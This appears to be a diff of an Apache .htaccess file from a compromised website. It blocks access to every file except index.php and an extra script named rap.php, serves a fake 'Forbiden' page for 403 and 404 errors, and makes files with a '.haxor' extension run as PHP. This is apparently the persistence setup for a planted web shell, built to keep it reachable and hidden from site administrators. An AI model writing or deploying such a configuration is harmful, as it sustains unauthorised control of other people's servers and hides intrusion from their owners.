@@ -7,11 +7,11 @@ Deny from all
 Order Deny,Allow
 Deny from all
 </FilesMatch>
-<FilesMatch '^(index.php|rap.php)$'>
+<FilesMatch '^(rap.php|index.php)$'>
 Order allow,deny
 Allow from all
 </FilesMatch>
-ErrorDocument 403 ""
-ErrorDocument 404 "" 
+ErrorDocument 403 "<html><head><title>403</title></head><body><center>Forbiden</center><br></body></html>"
+ErrorDocument 404 "<html><head><title>403</title></head><body><center>Forbiden</center><br></body></html>" 
 
 AddType Application/x-httpd-php .haxor
